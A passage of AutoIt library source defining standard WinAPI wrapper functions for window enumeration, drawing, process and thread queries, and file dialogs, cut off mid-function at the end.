Func _WinAPI_EnumWindowsPopup()
	__winapi_enumwindowsinit()
	Local $hwnd = _WinAPI_GetWindow(_WinAPI_GetDesktopWindow(), $__winapiconstant_gw_child)
	Local $sclass
	While $hwnd <> 0
		If _WinAPI_IsWindowVisible($hwnd) Then
			$sclass = _WinAPI_GetClassName($hwnd)
			If $sclass = "#32768" Then
				__winapi_enumwindowsadd($hwnd)
			ElseIf $sclass = "ToolbarWindow32" Then
				__winapi_enumwindowsadd($hwnd)
			ElseIf $sclass = "ToolTips_Class32" Then
				__winapi_enumwindowsadd($hwnd)
			ElseIf $sclass = "BaseBar" Then
				__winapi_enumwindowschild($hwnd)
			EndIf
		EndIf
		$hwnd = _WinAPI_GetWindow($hwnd, $__winapiconstant_gw_hwndnext)
	WEnd
	Return $__gawinlist_winapi
EndFunc   ;==>_WinAPI_EnumWindowsPopup

Func _WinAPI_EnumWindowsTop()
	__winapi_enumwindowsinit()
	Local $hwnd = _WinAPI_GetWindow(_WinAPI_GetDesktopWindow(), $__winapiconstant_gw_child)
	While $hwnd <> 0
		If _WinAPI_IsWindowVisible($hwnd) Then __winapi_enumwindowsadd($hwnd)
		$hwnd = _WinAPI_GetWindow($hwnd, $__winapiconstant_gw_hwndnext)
	WEnd
	Return $__gawinlist_winapi
EndFunc   ;==>_WinAPI_EnumWindowsTop

Func _WinAPI_ExpandEnvironmentStrings($sstring)
	Local $aresult = DllCall("kernel32.dll", "dword", "ExpandEnvironmentStringsW", "wstr", $sstring, "wstr", "", "dword", 4096)
	If @error Then Return SetError(@error, @extended, "")
	Return $aresult[2]
EndFunc   ;==>_WinAPI_ExpandEnvironmentStrings

Func _WinAPI_ExtractIconEx($sfile, $iindex, $plarge, $psmall, $iicons)
	Local $aresult = DllCall("shell32.dll", "uint", "ExtractIconExW", "wstr", $sfile, "int", $iindex, "struct*", $plarge, "struct*", $psmall, "uint", $iicons)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_ExtractIconEx

Func _WinAPI_FatalAppExit($smessage)
	DllCall("kernel32.dll", "none", "FatalAppExitW", "uint", 0, "wstr", $smessage)
	If @error Then Return SetError(@error, @extended)
EndFunc   ;==>_WinAPI_FatalAppExit

Func _WinAPI_FillRect($hdc, $ptrrect, $hbrush)
	Local $aresult
	If IsPtr($hbrush) Then
		$aresult = DllCall("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $ptrrect, "handle", $hbrush)
	Else
		$aresult = DllCall("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $ptrrect, "dword_ptr", $hbrush)
	EndIf
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_FillRect

Func _WinAPI_FindExecutable($sfilename, $sdirectory = "")
	Local $aresult = DllCall("shell32.dll", "INT", "FindExecutableW", "wstr", $sfilename, "wstr", $sdirectory, "wstr", "")
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $aresult[3])
EndFunc   ;==>_WinAPI_FindExecutable

Func _WinAPI_FindWindow($sclassname, $swindowname)
	Local $aresult = DllCall("user32.dll", "hwnd", "FindWindowW", "wstr", $sclassname, "wstr", $swindowname)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_FindWindow

Func _WinAPI_FlashWindow($hwnd, $finvert = True)
	Local $aresult = DllCall("user32.dll", "bool", "FlashWindow", "hwnd", $hwnd, "bool", $finvert)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_FlashWindow

Func _WinAPI_FlashWindowEx($hwnd, $iflags = 3, $icount = 3, $itimeout = 0)
	Local $tflash = DllStructCreate($tagflashwinfo)
	Local $iflash = DllStructGetSize($tflash)
	Local $imode = 0
	If BitAND($iflags, 1) <> 0 Then $imode = BitOR($imode, $__winapiconstant_flashw_caption)
	If BitAND($iflags, 2) <> 0 Then $imode = BitOR($imode, $__winapiconstant_flashw_tray)
	If BitAND($iflags, 4) <> 0 Then $imode = BitOR($imode, $__winapiconstant_flashw_timer)
	If BitAND($iflags, 8) <> 0 Then $imode = BitOR($imode, $__winapiconstant_flashw_timernofg)
	DllStructSetData($tflash, "Size", $iflash)
	DllStructSetData($tflash, "hWnd", $hwnd)
	DllStructSetData($tflash, "Flags", $imode)
	DllStructSetData($tflash, "Count", $icount)
	DllStructSetData($tflash, "Timeout", $itimeout)
	Local $aresult = DllCall("user32.dll", "bool", "FlashWindowEx", "struct*", $tflash)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_FlashWindowEx

Func _WinAPI_FloatToInt($nfloat)
	Local $tfloat = DllStructCreate("float")
	Local $tint = DllStructCreate("int", DllStructGetPtr($tfloat))
	DllStructSetData($tfloat, 1, $nfloat)
	Return DllStructGetData($tint, 1)
EndFunc   ;==>_WinAPI_FloatToInt

Func _WinAPI_FlushFileBuffers($hfile)
	Local $aresult = DllCall("kernel32.dll", "bool", "FlushFileBuffers", "handle", $hfile)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_FlushFileBuffers

Func _WinAPI_FormatMessage($iflags, $psource, $imessageid, $ilanguageid, ByRef $pbuffer, $isize, $varguments)
	Local $sbuffertype = "struct*"
	If IsString($pbuffer) Then $sbuffertype = "wstr"
	Local $aresult = DllCall("Kernel32.dll", "dword", "FormatMessageW", "dword", $iflags, "ptr", $psource, "dword", $imessageid, "dword", $ilanguageid, $sbuffertype, $pbuffer, "dword", $isize, "ptr", $varguments)
	If @error Then Return SetError(@error, @extended, 0)
	If $sbuffertype = "wstr" Then $pbuffer = $aresult[5]
	Return $aresult[0]
EndFunc   ;==>_WinAPI_FormatMessage

Func _WinAPI_FrameRect($hdc, $ptrrect, $hbrush)
	Local $aresult = DllCall("user32.dll", "int", "FrameRect", "handle", $hdc, "ptr", $ptrrect, "handle", $hbrush)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_FrameRect

Func _WinAPI_FreeLibrary($hmodule)
	Local $aresult = DllCall("kernel32.dll", "bool", "FreeLibrary", "handle", $hmodule)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_FreeLibrary

Func _WinAPI_GetAncestor($hwnd, $iflags = 1)
	Local $aresult = DllCall("user32.dll", "hwnd", "GetAncestor", "hwnd", $hwnd, "uint", $iflags)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetAncestor

Func _WinAPI_GetAsyncKeyState($ikey)
	Local $aresult = DllCall("user32.dll", "short", "GetAsyncKeyState", "int", $ikey)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetAsyncKeyState

Func _WinAPI_GetBkMode($hdc)
	Local $aresult = DllCall("gdi32.dll", "int", "GetBkMode", "handle", $hdc)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetBkMode

Func _WinAPI_GetClassName($hwnd)
	If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
	Local $aresult = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
	If @error Then Return SetError(@error, @extended, False)
	Return SetExtended($aresult[0], $aresult[2])
EndFunc   ;==>_WinAPI_GetClassName

Func _WinAPI_GetClientHeight($hwnd)
	Local $trect = _WinAPI_GetClientRect($hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top")
EndFunc   ;==>_WinAPI_GetClientHeight

Func _WinAPI_GetClientWidth($hwnd)
	Local $trect = _WinAPI_GetClientRect($hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
EndFunc   ;==>_WinAPI_GetClientWidth

Func _WinAPI_GetClientRect($hwnd)
	Local $trect = DllStructCreate($tagrect)
	DllCall("user32.dll", "bool", "GetClientRect", "hwnd", $hwnd, "struct*", $trect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $trect
EndFunc   ;==>_WinAPI_GetClientRect

Func _WinAPI_GetCurrentProcess()
	Local $aresult = DllCall("kernel32.dll", "handle", "GetCurrentProcess")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetCurrentProcess

Func _WinAPI_GetCurrentProcessID()
	Local $aresult = DllCall("kernel32.dll", "dword", "GetCurrentProcessId")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetCurrentProcessID

Func _WinAPI_GetCurrentThread()
	Local $aresult = DllCall("kernel32.dll", "handle", "GetCurrentThread")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetCurrentThread

Func _WinAPI_GetCurrentThreadId()
	Local $aresult = DllCall("kernel32.dll", "dword", "GetCurrentThreadId")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetCurrentThreadId

Func _WinAPI_GetCursorInfo()
	Local $tcursor = DllStructCreate($tagcursorinfo)
	Local $icursor = DllStructGetSize($tcursor)
	DllStructSetData($tcursor, "Size", $icursor)
	DllCall("user32.dll", "bool", "GetCursorInfo", "struct*", $tcursor)
	If @error Then Return SetError(@error, @extended, 0)
	Local $acursor[5]
	$acursor[0] = True
	$acursor[1] = DllStructGetData($tcursor, "Flags") <> 0
	$acursor[2] = DllStructGetData($tcursor, "hCursor")
	$acursor[3] = DllStructGetData($tcursor, "X")
	$acursor[4] = DllStructGetData($tcursor, "Y")
	Return $acursor
EndFunc   ;==>_WinAPI_GetCursorInfo

Func _WinAPI_GetDC($hwnd)
	Local $aresult = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetDC

Func _WinAPI_GetDesktopWindow()
	Local $aresult = DllCall("user32.dll", "hwnd", "GetDesktopWindow")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetDesktopWindow

Func _WinAPI_GetDeviceCaps($hdc, $iindex)
	Local $aresult = DllCall("gdi32.dll", "int", "GetDeviceCaps", "handle", $hdc, "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetDeviceCaps

Func _WinAPI_GetDIBits($hdc, $hbmp, $istartscan, $iscanlines, $pbits, $pbi, $iusage)
	Local $aresult = DllCall("gdi32.dll", "int", "GetDIBits", "handle", $hdc, "handle", $hbmp, "uint", $istartscan, "uint", $iscanlines, "ptr", $pbits, "ptr", $pbi, "uint", $iusage)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetDIBits

Func _WinAPI_GetDlgCtrlID($hwnd)
	Local $aresult = DllCall("user32.dll", "int", "GetDlgCtrlID", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetDlgCtrlID

Func _WinAPI_GetDlgItem($hwnd, $iitemid)
	Local $aresult = DllCall("user32.dll", "hwnd", "GetDlgItem", "hwnd", $hwnd, "int", $iitemid)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetDlgItem

Func _WinAPI_GetFocus()
	Local $aresult = DllCall("user32.dll", "hwnd", "GetFocus")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetFocus

Func _WinAPI_GetForegroundWindow()
	Local $aresult = DllCall("user32.dll", "hwnd", "GetForegroundWindow")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetForegroundWindow

Func _WinAPI_GetGuiResources($iflag = 0, $hprocess = -1)
	If $hprocess = -1 Then $hprocess = _WinAPI_GetCurrentProcess()
	Local $aresult = DllCall("user32.dll", "dword", "GetGuiResources", "handle", $hprocess, "dword", $iflag)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetGuiResources

Func _WinAPI_GetIconInfo($hicon)
	Local $tinfo = DllStructCreate($tagiconinfo)
	DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $tinfo)
	If @error Then Return SetError(@error, @extended, 0)
	Local $aicon[6]
	$aicon[0] = True
	$aicon[1] = DllStructGetData($tinfo, "Icon") <> 0
	$aicon[2] = DllStructGetData($tinfo, "XHotSpot")
	$aicon[3] = DllStructGetData($tinfo, "YHotSpot")
	$aicon[4] = DllStructGetData($tinfo, "hMask")
	$aicon[5] = DllStructGetData($tinfo, "hColor")
	Return $aicon
EndFunc   ;==>_WinAPI_GetIconInfo

Func _WinAPI_GetFileSizeEx($hfile)
	Local $aresult = DllCall("kernel32.dll", "bool", "GetFileSizeEx", "handle", $hfile, "int64*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[2]
EndFunc   ;==>_WinAPI_GetFileSizeEx

Func _WinAPI_GetLayeredWindowAttributes($hwnd, ByRef $i_transcolor, ByRef $transparency, $ascolorref = False)
	$i_transcolor = -1
	$transparency = -1
	Local $aresult = DllCall("user32.dll", "bool", "GetLayeredWindowAttributes", "hwnd", $hwnd, "dword*", $i_transcolor, "byte*", $transparency, "dword*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If Not $ascolorref Then
		$aresult[2] = Int(BinaryMid($aresult[2], 3, 1) & BinaryMid($aresult[2], 2, 1) & BinaryMid($aresult[2], 1, 1))
	EndIf
	$i_transcolor = $aresult[2]
	$transparency = $aresult[3]
	Return $aresult[4]
EndFunc   ;==>_WinAPI_GetLayeredWindowAttributes

Func _WinAPI_GetModuleHandle($smodulename)
	Local $smodulenametype = "wstr"
	If $smodulename = "" Then
		$smodulename = 0
		$smodulenametype = "ptr"
	EndIf
	Local $aresult = DllCall("kernel32.dll", "handle", "GetModuleHandleW", $smodulenametype, $smodulename)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetModuleHandle

Func _WinAPI_GetMousePos($ftoclient = False, $hwnd = 0)
	Local $imode = Opt("MouseCoordMode", 1)
	Local $apos = MouseGetPos()
	Opt("MouseCoordMode", $imode)
	Local $tpoint = DllStructCreate($tagpoint)
	DllStructSetData($tpoint, "X", $apos[0])
	DllStructSetData($tpoint, "Y", $apos[1])
	If $ftoclient Then
		_WinAPI_ScreenToClient($hwnd, $tpoint)
		If @error Then Return SetError(@error, @extended, 0)
	EndIf
	Return $tpoint
EndFunc   ;==>_WinAPI_GetMousePos

Func _WinAPI_GetMousePosX($ftoclient = False, $hwnd = 0)
	Local $tpoint = _WinAPI_GetMousePos($ftoclient, $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($tpoint, "X")
EndFunc   ;==>_WinAPI_GetMousePosX

Func _WinAPI_GetMousePosY($ftoclient = False, $hwnd = 0)
	Local $tpoint = _WinAPI_GetMousePos($ftoclient, $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($tpoint, "Y")
EndFunc   ;==>_WinAPI_GetMousePosY

Func _WinAPI_GetObject($hobject, $isize, $pobject)
	Local $aresult = DllCall("gdi32.dll", "int", "GetObjectW", "handle", $hobject, "int", $isize, "ptr", $pobject)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetObject

Func _WinAPI_GetOpenFileName($stitle = "", $sfilter = "All files (*.*)", $sinitaldir = ".", $sdefaultfile = "", $sdefaultext = "", $ifilterindex = 1, $iflags = 0, $iflagsex = 0, $hwndowner = 0)
	Local $ipathlen = 4096
	Local $inulls = 0
	Local $tofn = DllStructCreate($tagopenfilename)
	Local $afiles[1] = [0]
	Local $iflag = $iflags
	Local $asflines = StringSplit($sfilter, "|")
	Local $asfilter[$asflines[0] * 2 + 1]
	Local $istart, $ifinal, $stfilter
	$asfilter[0] = $asflines[0] * 2
	For $i = 1 To $asflines[0]
		$istart = StringInStr($asflines[$i], "(", 0, 1)
		$ifinal = StringInStr($asflines[$i], ")", 0, -1)
		$asfilter[$i * 2 - 1] = StringStripWS(StringLeft($asflines[$i], $istart - 1), 3)
		$asfilter[$i * 2] = StringStripWS(StringTrimRight(StringTrimLeft($asflines[$i], $istart), StringLen($asflines[$i]) - $ifinal + 1), 3)
		$stfilter &= "wchar[" & StringLen($asfilter[$i * 2 - 1]) + 1 & "];wchar[" & StringLen($asfilter[$i * 2]) + 1 & "];"
	Next
	Local $ttitle = DllStructCreate("wchar Title[" & StringLen($stitle) + 1 & "]")
	Local $tinitialdir = DllStructCreate("wchar InitDir[" & StringLen($sinitaldir) + 1 & "]")
	Local $tfilter = DllStructCreate($stfilter & "wchar")
	Local $tpath = DllStructCreate("wchar Path[" & $ipathlen & "]")
	Local $textn = DllStructCreate("wchar Extension[" & StringLen($sdefaultext) + 1 & "]")
	For $i = 1 To $asfilter[0]
		DllStructSetData($tfilter, $i, $asfilter[$i])
	Next
	DllStructSetData($ttitle, "Title", $stitle)
	DllStructSetData($tinitialdir, "InitDir", $sinitaldir)
	DllStructSetData($tpath, "Path", $sdefaultfile)
	DllStructSetData($textn, "Extension", $sdefaultext)
	DllStructSetData($tofn, "StructSize", DllStructGetSize($tofn))
	DllStructSetData($tofn, "hwndOwner", $hwndowner)
	DllStructSetData($tofn, "lpstrFilter", DllStructGetPtr($tfilter))
	DllStructSetData($tofn, "nFilterIndex", $ifilterindex)
	DllStructSetData($tofn, "lpstrFile", DllStructGetPtr($tpath))
	DllStructSetData($tofn, "nMaxFile", $ipathlen)
	DllStructSetData($tofn, "lpstrInitialDir", DllStructGetPtr($tinitialdir))
	DllStructSetData($tofn, "lpstrTitle", DllStructGetPtr($ttitle))
	DllStructSetData($tofn, "Flags", $iflag)
	DllStructSetData($tofn, "lpstrDefExt", DllStructGetPtr($textn))
	DllStructSetData($tofn, "FlagsEx", $iflagsex)
	DllCall("comdlg32.dll", "bool", "GetOpenFileNameW", "struct*", $tofn)
	If @error Then Return SetError(@error, @extended, $afiles)
	If BitAND($iflags, $ofn_allowmultiselect) = $ofn_allowmultiselect And BitAND($iflags, $ofn_explorer) = $ofn_explorer Then
		For $x = 1 To $ipathlen
			If DllStructGetData($tpath, "Path", $x) = Chr(0) Then
				DllStructSetData($tpath, "Path", "|", $x)
				$inulls += 1
			Else
				$inulls = 0
			EndIf
			If $inulls = 2 Then ExitLoop
		Next
		DllStructSetData($tpath, "Path", Chr(0), $x - 1)
		$afiles = StringSplit(DllStructGetData($tpath, "Path"), "|")
		If $afiles[0] = 1 Then Return __winapi_parsefiledialogpath(DllStructGetData($tpath, "Path"))
		Return StringSplit(DllStructGetData($tpath, "Path"), "|")
	ElseIf BitAND($iflags, $ofn_allowmultiselect) = $ofn_allowmultiselect Then
		$afiles = StringSplit(DllStructGetData($tpath, "Path"), " ")
		If $afiles[0] = 1 Then Return __winapi_parsefiledialogpath(DllStructGetData($tpath, "Path"))
		Return StringSplit(StringReplace(DllStructGetData($tpath, "Path"), " ", "|"), "|")
	Else
		Return __winapi_parsefiledialogpath(DllStructGetData($tpath, "Path"))
	EndIf
EndFunc   ;==>_WinAPI_GetOpenFileName

Func _WinAPI_GetOverlappedResult($hfile, $poverlapped, ByRef $ibytes, $fwait = False)
	Local $aresult = DllCall("kernel32.dll", "bool", "GetOverlappedResult", "handle", $hfile, "ptr", $poverlapped, "dword*", 0, "bool", $fwait)
	If @error Then Return SetError(@error, @extended, False)
	$ibytes = $aresult[3]
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetOverlappedResult

Func _WinAPI_GetParent($hwnd)
	Local $aresult = DllCall("user32.dll", "hwnd", "GetParent", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetParent

Func _WinAPI_GetProcessAffinityMask($hprocess)
	Local $aresult = DllCall("kernel32.dll", "bool", "GetProcessAffinityMask", "handle", $hprocess, "dword_ptr*", 0, "dword_ptr*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	Local $amask[3]
	$amask[0] = True
	$amask[1] = $aresult[2]
	$amask[2] = $aresult[3]
	Return $amask
EndFunc   ;==>_WinAPI_GetProcessAffinityMask

Func _WinAPI_GetSaveFileName($stitle = "", $sfilter = "All files (*.*)", $sinitaldir = ".", $sdefaultfile = "", $sdefaultext = "", $ifilterindex = 1, $iflags = 0, $iflagsex = 0, $hwndowner = 0)
	Local $ipathlen = 4096
	Local $tofn = DllStructCreate($tagopenfilename)
	Local $afiles[1] = [0]
	Local $iflag = $iflags
	Local $asflines = StringSplit($sfilter, "|")
	Local $asfilter[$asflines[0] * 2 + 1]
	Local $istart, $ifinal, $stfilter
	$asfilter[0] = $asflines[0] * 2
	For $i = 1 To $asflines[0]
		$istart = StringInStr($asflines[$i], "(", 0, 1)
		$ifinal = StringInStr($asflines[$i], ")", 0, -1)
		$asfilter[$i * 2 - 1] = StringStripWS(StringLeft($asflines[$i], $istart - 1), 3)
		$asfilter[$i * 2] = StringStripWS(StringTrimRight(StringTrimLeft($asflines[$i], $istart), StringLen($asflines[$i]) - $ifinal + 1), 3)
		$stfilter &= "wchar[" & StringLen($asfilter[$i * 2 - 1]) + 1 & "];wchar[" & StringLen($asfilter[$i * 2]) + 1 & "];"
	Next
	Local $ttitle = DllStructCreate("wchar Title[" & StringLen($stitle) + 1 & "]")
	Local $tinitialdir = DllStructCreate("wchar InitDir[" & StringLen($sinitaldir) + 1 & "]")
	Local $tfilter = DllStructCreate($stfilter & "wchar")
	Local $tpath = DllStructCreate("wchar Path[" & $ipathlen & "]")
	Local $textn = DllStructCreate("wchar Extension[" & StringLen($sdefaultext) + 1 & "]")
	For $i = 1 To $asfilter[0]
		DllStructSetData($tfilter, $i, $asfilter[$i])
	Next
	DllStructSetData($ttitle, "Title", $stitle)
	DllStructSetData($tinitialdir, "InitDir", $sinitaldir)
	DllStructSetData($tpath, "Path", $sdefaultfile)
	DllStructSetData($textn, "Extension", $sdefaultext)
	DllStructSetData($tofn, "StructSize", DllStructGetSize($tofn))
	DllStructSetData($tofn, "hwndOwner", $hwndowner)
	DllStructSetData($tofn, "lpstrFilter", DllStructGetPtr($tfilter))
	DllStructSetData($tofn, "nFilterIndex", $ifilterindex)
	DllStructSetData($tofn, "lpstrFile", DllStructGetPtr($tpath))
	DllStructSetData($tofn, "nMaxFile", $ipathlen)
	DllStructSetData($tofn, "lpstrInitialDir", DllStructGetPtr($tinitialdir))
	DllStructSetData($tofn, "lpstrTitle", DllStructGetPtr($ttitle))
	DllStructSetData($tofn, "Flags", $iflag)
	DllStructSetData($tofn, "lpstrDefExt", DllStructGetPtr($textn))
	DllStructSetData($tofn, "FlagsEx", $iflagsex)
	DllCall("comdlg32.dll", "bool", "GetSaveFileNameW", "struct*", $tofn)
	If @error Then Return SetError(@error, @extended, $afiles)
	Return __winapi_parsefiledialogpath(DllStructGetData($tpath, "Path"))
EndFunc   ;==>_WinAPI_GetSaveFileName

Func _WinAPI_GetStockObject($iobject)
	Local $aresult = DllCall("gdi32.dll", "handle", "GetStockObject", "int", $iobject)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetStockObject

Func _WinAPI_GetStdHandle($istdhandle)
	If $istdhandle < 0 Or $istdhandle > 2 Then Return SetError(2, 0, -1)
	Local Const $ahandle[3] = [-10, -11, -12]
	Local $aresult = DllCall("kernel32.dll", "handle", "GetStdHandle", "dword", $ahandle[$istdhandle])
	If @error Then Return SetError(@error, @extended, -1)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetStdHandle

Func _WinAPI_GetSysColor($iindex)
	Local $aresult = DllCall("user32.dll", "dword", "GetSysColor", "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetSysColor

Func _WinAPI_GetSysColorBrush($iindex)
	Local $aresult = DllCall("user32.dll", "handle", "GetSysColorBrush", "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetSysColorBrush

Func _WinAPI_GetSystemMetrics($iindex)
	Local $aresult = DllCall("user32.dll", "int", "GetSystemMetrics", "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetSystemMetrics

Func _WinAPI_GetTextExtentPoint32($hdc, $stext)
	Local $tsize = DllStructCreate($tagsize)
	Local $isize = StringLen($stext)
	DllCall("gdi32.dll", "bool", "GetTextExtentPoint32W", "handle", $hdc, "wstr", $stext, "int", $isize, "struct*", $tsize)
	If @error Then Return SetError(@error, @extended, 0)
	Return $tsize
EndFunc   ;==>_WinAPI_GetTextExtentPoint32

Func _WinAPI_GetTextMetrics($hdc)
	Local $ttextmetric = DllStructCreate($tagtextmetric)
	Local $ret = DllCall("gdi32.dll", "bool", "GetTextMetricsW", "handle", $hdc, "struct*", $ttextmetric)
	If @error Then Return SetError(@error, @extended, 0)
	If Not $ret[0] Then Return SetError(-1, 0, 0)
	Return $ttextmetric
EndFunc   ;==>_WinAPI_GetTextMetrics

Func _WinAPI_GetWindow($hwnd, $icmd)
	Local $aresult = DllCall("user32.dll", "hwnd", "GetWindow", "hwnd", $hwnd, "uint", $icmd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetWindow

Func _WinAPI_GetWindowDC($hwnd)
	Local $aresult = DllCall("user32.dll", "handle", "GetWindowDC", "hwnd", $hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetWindowDC

Func _WinAPI_GetWindowHeight($hwnd)
	Local $trect = _WinAPI_GetWindowRect($hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top")
EndFunc   ;==>_WinAPI_GetWindowHeight

Func _WinAPI_GetWindowLong($hwnd, $iindex)
	Local $sfuncname = "GetWindowLongW"
	If @AutoItX64 Then $sfuncname = "GetWindowLongPtrW"
	Local $aresult = DllCall("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetWindowLong

Func _WinAPI_GetWindowPlacement($hwnd)
	Local $twindowplacement = DllStructCreate($tagwindowplacement)
	DllStructSetData($twindowplacement, "length", DllStructGetSize($twindowplacement))
	DllCall("user32.dll", "bool", "GetWindowPlacement", "hwnd", $hwnd, "struct*", $twindowplacement)
	If @error Then Return SetError(@error, @extended, 0)
	Return $twindowplacement
EndFunc   ;==>_WinAPI_GetWindowPlacement

Func _WinAPI_GetWindowRect($hwnd)
	Local $trect = DllStructCreate($tagrect)
	DllCall("user32.dll", "bool", "GetWindowRect", "hwnd", $hwnd, "struct*", $trect)
	If @error Then Return SetError(@error, @extended, 0)
	Return $trect
EndFunc   ;==>_WinAPI_GetWindowRect

Func _WinAPI_GetWindowRgn($hwnd, $hrgn)
	Local $aresult = DllCall("user32.dll", "int", "GetWindowRgn", "hwnd", $hwnd, "handle", $hrgn)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetWindowRgn

Func _WinAPI_GetWindowText($hwnd)
	Local $aresult = DllCall("user32.dll", "int", "GetWindowTextW", "hwnd", $hwnd, "wstr", "", "int", 4096)
	If @error Then Return SetError(@error, @extended, "")
	Return SetExtended($aresult[0], $aresult[2])
EndFunc   ;==>_WinAPI_GetWindowText

Func _WinAPI_GetWindowThreadProcessId($hwnd, ByRef $ipid)
	Local $aresult = DllCall("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	$ipid = $aresult[2]
	Return $aresult[0]
EndFunc   ;==>_WinAPI_GetWindowThreadProcessId

Func _WinAPI_GetWindowWidth($hwnd)
	Local $trect = _WinAPI_GetWindowRect($hwnd)
	If @error Then Return SetError(@error, @extended, 0)
	Return DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
EndFunc   ;==>_WinAPI_GetWindowWidth

Func _WinAPI_GetXYFromPoint(ByRef $tpoint, ByRef $ix, ByRef $iy)
	$ix = DllStructGetData($tpoint, "X")
	$iy = DllStructGetData($tpoint, "Y")
EndFunc   ;==>_WinAPI_GetXYFromPoint

Func _WinAPI_GlobalMemoryStatus()
	Local $tmem = DllStructCreate($tagmemorystatusex)
	Local $imem = DllStructGetSize($tmem)
	DllStructSetData($tmem, 1, $imem)
	DllCall("kernel32.dll", "none", "GlobalMemoryStatusEx", "ptr", $tmem)
	If @error Then Return SetError(@error, @extended, 0)
	Local $amem[7]
	$amem[0] = DllStructGetData($tmem, 2)
	$amem[1] = DllStructGetData($tmem, 3)
	$amem[2] = DllStructGetData($tmem, 4)
	$amem[3] = DllStructGetData($tmem, 5)
	$amem[4] = DllStructGetData($tmem, 6)
	$amem[5] = DllStructGetData($tmem, 7)
	$amem[6] = DllStructGetData($tmem, 8)
	Return $amem
EndFunc   ;==>_WinAPI_GlobalMemoryStatus

Func _WinAPI_GUIDFromString($sguid)
	Local $tguid = DllStructCreate($tagguid)
